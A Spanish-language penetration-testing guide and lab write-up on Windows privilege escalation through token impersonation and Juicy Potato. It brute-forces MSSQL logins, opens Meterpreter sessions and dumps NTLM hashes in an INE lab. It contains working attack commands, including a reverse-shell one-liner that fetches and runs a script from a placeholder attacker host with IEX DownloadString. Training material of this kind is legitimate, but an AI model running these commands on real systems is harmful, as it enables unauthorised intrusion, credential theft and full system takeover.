
# Impersonation Attacks

Esta guía cubre dos técnicas de escalada de privilegios en sistemas Windows: **Access Token Impersonation** (suplantación de tokens) y **Juicy Potato**. Ambas explotan privilegios mal configurados para obtener acceso como SYSTEM o como otro usuario elevado.

## <mark style="color:purple;">Access Token Impersonation</mark>

Un *token de acceso* es un objeto que contiene la identidad y los privilegios de un proceso o hilo. Windows permite a un proceso con el privilegio `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` “suplantar” el token de otro proceso (por ejemplo, un servicio en ejecución). Si un atacante obtiene un proceso con esos privilegios, puede robar el token de un proceso con mayor nivel (como SYSTEM) y crear un nuevo proceso con esos privilegios.

#### **¿Cómo explotarlo?**

* **Escenario común**: Ganar acceso a un servicio o aplicación que se ejecuta con privilegios altos y que permite la suplantación (como `SeImpersonatePrivilege`).
* **Herramientas**: Meterpreter (con el módulo `incognito`), `Incognito` standalone, `Invoke-TokenManipulation.ps1`, `Rubeus` (para kerberos), etc.

### **Comandos clave (Meterpreter)**

#### **Verificar privilegios del proceso actual**

En una sesión de Meterpreter:

```bash
getprivs
```

Busca `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`.

#### **Cargar el módulo Incognito**

Podemos usar el módulo incógnito para mostrar un listado de tokens que podemos impersonar:

```bash
load incognito
```

#### **Listar tokens disponibles**

Listar tokens delegables (que se pueden usar para suplantar):

```bash
list_tokens -u
```

Listar tokens impersonables:

```bash
list_tokens -g
```

#### **Suplantar un token**

Por ejemplo, para suplantar el token de `NT AUTHORITY\SYSTEM`:

```bash
impersonate_token "NT AUTHORITY\SYSTEM"
```

Si funciona, ahora el shell de Meterpreter se ejecuta como SYSTEM.

#### **Verificar identidad**

```bash
getuid
```

#### **Migrar a un proceso estable**

Después de suplantar SYSTEM, puedes migrar a un proceso como `winlogon.exe` para mantener el privilegio:

```bash
ps
migrate <PID_de_winlogon>
```

{% hint style="info" %}
**Nota**: También puedes usar `incognito` de forma independiente (descargar incognito.exe) o `Invoke-TokenManipulation.ps1` en una shell de PowerShell.
{% endhint %}

***

## <mark style="color:purple;">Juicy Potato</mark>

Juicy Potato es una evolución de la técnica "Rotten Potato". Explota el privilegio `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` combinado con un mecanismo de autenticación COM (DCOM) para forzar a un servicio a autenticarse contra un servidor controlado por el atacante, capturando el token de SYSTEM y utilizándolo para lanzar un proceso con privilegios de SYSTEM.

Funciona en Windows 7 a Windows 10 (y Server 2008/2012/2016/2019) aunque puede requerir ajustes según la versión.

#### **Requisitos**

* Tener el privilegio `SeImpersonatePrivilege` habilitado.
* Poder lanzar un proceso como el usuario actual.
* Conocer un CLSID válido para el sistema operativo objetivo (para crear el objeto COM).

### **Comandos clave**

#### **Descargar JuicyPotato.exe**&#x20;

(o JuicyPotatoNG) en la máquina víctima.

{% embed url="<https://github.com/ohpe/juicy-potato>" %}

{% embed url="<https://github.com/antonioCoco/JuicyPotatoNG>" %}

```powershell
# Ejemplo con PowerShell
Invoke-WebRequest -Uri "http://tu-servidor/JuicyPotato.exe" -OutFile JuicyPotato.exe
```

#### **Ejecutar JuicyPotato**

Sintaxis básica:

```ps
JuicyPotato.exe -t <tipo> -p <programa> -l <puerto> -c <CLSID> -a "<argumentos>"
```

* `-t` : tipo de creación del proceso: `*` (automático), `1` (CrearProcessWithToken), `2` (CreateProcessAsUser), `3` (CreateProcess)
* `-p` : programa a ejecutar (ej: cmd.exe, powershell.exe, reverse shell)
* `-l` : puerto local para escuchar (ej: 1337)
* `-c` : CLSID a utilizar (lista según versión de Windows)
* `-a` : argumentos para el programa

Ejemplo para lanzar una shell como SYSTEM:

```powershell
JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c whoami > C:\temp\output.txt"
```

Si funciona, verás que el comando se ejecuta como SYSTEM.

**Obtener una reverse shell**

Con netcat en tu máquina atacante:

```bash
nc -lvnp 4444
```

En la víctima:

```powershell
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://tu-ip/reverse.ps1')"
```

**Lista de CLSIDs útiles**

Puedes obtener CLSIDs válidos para la versión de Windows desde <https://github.com/ohpe/juicy-potato/tree/master/CLSID> o con herramientas como `GetCLSID.ps1`.

Ejemplos:

* Windows 10 (x64): `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` (BITS)
* Windows Server 2016: `{E60687F7-01A1-40AA-86AC-DB1CBF673334}`

1. **Verificar resultado**\
   Comprueba con `whoami` que el proceso se ejecuta como `NT AUTHORITY\SYSTEM`.

***

## <mark style="color:purple;">Lab: MSSQL Juicy Potato Privilege Escalation</mark>

Se le proporciona una máquina Kali GUI y una máquina objetivo que ejecuta un servidor vulnerable. La máquina objetivo es accesible en **'demo.ine.local'** .

Tu tarea consiste en obtener el footprint de la aplicación utilizando las herramientas disponibles en la máquina Kali y explotar la aplicación utilizando el módulo Metasploit apropiado.

Luego, eleve sus privilegios utilizando el módulo de explotación local de Metasploit [juicy-potato](https://github.com/ohpe/juicy-potato).

**Objetivo**: Obtener el máximo privilegio en la máquina comprometida y conseguir dos flags.

#### Host

Nuestro objetivo es demo.ine.local:

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.14       INE
127.0.0.1 AttackDefense-Kali
10.10.41.3      INE
10.2.25.231    demo.ine.local
```

#### Escaneo de puertos

Tenemos multitud de puertos abiertos en la máquina objetivo, lo normal en sistemas Windows como un Domain Controller:

```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn -n -sS -sV demo.ine.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-31 11:36:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: CONTOSO)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: MSSQL-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Observamos que es un sistema muy antiguo: `Microsoft Windows Server 2008 R2`, y nuestro vector de entrada será Microsoft SQL Server 2019.

### Enumeración de MS SQL

Un escaneo de puertos dirigido nos revela los hashes de todos los usuarios de MSSQL y vemos que el usuario `sa` tiene login anónimo:

```bash
┌──(root㉿INE)-[~]
└─# nmap --script ms-sql* -p 1433 demo.ine.local

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-dump-hashes: 
|   10.2.25.231:1433: 
|     sa:0x020031269b5a2003b41c02febbd2f7900828319899f18120cd3571175a0fa6acd994ff6bc537109eb7a0d0e4e2e76ade7e96ffac4461869b3edd8e6fb3a94618f415fabc6514
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     dbadmin:0x020074dfc3b8b8bfba09c068a44b6a2d1625720a2df75ed6689f9af7b9b6569470775da248d9dde4eaa8d225251a4256fab5b8a0b521cf55c9d3e30be58ba34883058f44e992
|     auditor:0x020059dd99ab556474042123d23c8820295214eac2c7fced373031f43c46e7676be42dea1da5ab1ccc0c41eb8a99f2bb47fabd496861b9056f5f5392aa74f1f9bade844285db
|_    admin:0x02001085159f39e04325127a7c0167bfa1363d73fe3f28b7e5f8dbd407b7ac4d6a48902f1f960f85b7f6c1c0d53714012c4fc33e924cd4f2edc8d1b7863d3d6d59da560ff0b5
|_ms-sql-config: ERROR: Script execution failed (use -d to debug)
| ms-sql-query: 
|_  (Use --script-args=ms-sql-query.query='<QUERY>' to change query.)
| ms-sql-brute: 
|   10.2.25.231:1433: 
| [10.2.25.239:1433]
|   Credentials found:
|_    admin:bubbles1 => Login Success
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)
| ms-sql-ntlm-info: 
|   10.2.25.231:1433: 
|     Target_Name: CONTOSO
|     NetBIOS_Domain_Name: CONTOSO
|     NetBIOS_Computer_Name: MSSQL-SERVER
|     DNS_Domain_Name: contoso.local
|     DNS_Computer_Name: MSSQL-Server.contoso.local
|     DNS_Tree_Name: contoso.local
|_    Product_Version: 10.0.14393
|_ms-sql-hasdbaccess: ERROR: Script execution failed (use -d to debug)
|_ms-sql-tables: ERROR: Script execution failed (use -d to debug)
| ms-sql-empty-password: 
|   10.2.25.231:1433: 
|_    sa:<empty> => Login Success
| ms-sql-info: 
|   10.2.25.231:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

```
sa:<empty> => Login Success
admin:bubbles1 => Login Success
```

#### Metasploit MSSQL Login

Confirmamos que hay login successful con los dos usuarios:

```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.2.25.231
set USER_FILE /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt
set PASS_FILE /root/Desktop/wordlists/100-common-passwords.txt
set VERBOSE false
exploit

[*] 10.2.25.239:1433      - 10.2.25.231:1433 - MSSQL - Starting authentication scanner.
[+] 10.2.25.239:1433      - 10.2.25.231:1433 - Login Successful: WORKSTATION\sa:
[+] 10.2.25.239:1433      - 10.2.25.231:1433 - Login Successful: WORKSTATION\admin:bubbles1
[*] 10.2.25.239:1433      - Scanned 1 of 1 hosts (100% complete)
[*] 10.2.25.239:1433      - Bruteforce completed, 2 credentials were successful.
```

### Explotación de MSSQL

```bash
use exploit/windows/mssql/mssql_payload
set RHOSTS 10.2.25.231
set USERNAME sa
set PASSWORD ""
set DATABASE ""
exploit

[[*] Started reverse TCP handler on 10.10.41.3:4444 
[*] 10.2.25.231:1433 - Command Stager progress -   1.47% done (1499/102246 bytes)
[*] 10.2.25.231:1433 - Command Stager progress -   2.93% done (2998/102246 bytes)
[*] 10.2.25.231:1433 - Command Stager progress -  96.76% done (98934/102246 bytes)
[*] 10.2.25.231:1433 - Command Stager progress -  98.19% done (100400/102246 bytes)
[*] 10.2.25.231:1433 - Command Stager progress -  99.59% done (101827/102246 bytes)
[*] 10.2.25.231:1433 - Command Stager progress - 100.00% done (102246/102246 bytes)
[*] Sending stage (176198 bytes) to 10.2.25.231
[*] Meterpreter session 1 opened (10.10.41.3:4444 -> 10.2.25.231:49736) at 2026-03-31 18:35:59 +0530

meterpreter > getuid
Server username: NT Service\MSSQL$SQLEXPRESS
```

Accedemos con una cuenta NT Service, y podríamos elevar privilegios a SYSTEM fácilmente con `getsystem`, pero en este caso nos centraremos en las técnicas de esta sección, como el Juicy Potato

### Comprobar privilegios

```bash
meterpreter > shell

Process 4520 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Observamos que tenemos privilegios `SeImpersonatePrivilege`, que nos permite explotar el Juicy Potato.

En la máquina Kali tenemos el exploit de Juicy Potato en la siguiente ruta:

```bash
┌──(root㉿INE)-[~/Desktop/tools/JuicyPotato]
└─# ls
JuicyPotato.exe
```

Lo podríamos cargar desde meterpreter con `upload`, o mejor aún, usar el módulo desde Metasploit.

### Juicy Potato Module

```bash
msf6 exploit(windows/mssql/mssql_payload) > search juicy potato

Matching Modules
================

   #  Name                                             Disclosure Date  Rank   Check  Description
   -  ----                                             ---------------  ----   -----  -----------
   0  exploit/windows/local/ms16_075_reflection_juicy  2016-01-16       great  Yes    Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms16_075_reflection_juicy

msf6 exploit(windows/mssql/mssql_payload) > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) >
```

```bash
set session 1
exploit

[*] Started reverse TCP handler on 10.10.41.3:4444 
[+] Target appears to be vulnerable (Windows Server 2016+ Build 14393)
[*] Launching notepad to host the exploit...
[+] Process 4920 launched.
[*] Reflectively injecting the exploit DLL into 4920...
[*] Injecting exploit into 4920...
[*] Exploit injected. Injecting exploit configuration into 4920...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.2.25.231
[*] Meterpreter session 3 opened (10.10.41.3:4444 -> 10.2.25.231:61868) at 2026-03-31 18:45:41 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Ya somos SYSTEM explotando Juicy Potato!

### Flag 1

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2021-01-20 12:39:32 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2016-07-16 18:48:08 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2021-01-14 03:13:36 +0530  Boot
040777/rwxrwxrwx  0       dir   2016-10-18 07:29:39 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-02-23 16:36:05 +0530  PerfLogs
040555/r-xr-xr-x  8192    dir   2021-03-25 11:24:35 +0530  Program Files
040777/rwxrwxrwx  8192    dir   2021-03-25 11:24:37 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2021-01-20 16:14:18 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2016-10-18 07:31:27 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2026-03-31 18:41:40 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2021-01-20 12:47:14 +0530  Users
040777/rwxrwxrwx  28672   dir   2021-01-20 15:03:44 +0530  Windows
100444/r--r--r--  388688  fil   2021-01-08 06:11:36 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2021-03-25 11:21:51 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag.txt 
78598a9b8d36f0112c543561********
```

### Flag 2

Hash NTLM del usuario administrador:

```bash
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124********:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e58b314aaf7595c4c21e62ae64950fc:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
alice:1113:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
bob:1114:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
sysadmin:1115:aad3b435b51404eeaad3b435b51404ee:7aa263ff83066e08faafeafa9eecb776:::
MSSQL-SERVER$:1009:aad3b435b51404eeaad3b435b51404ee:ff24ede900bbf14e30261e705d8ada79:::
```
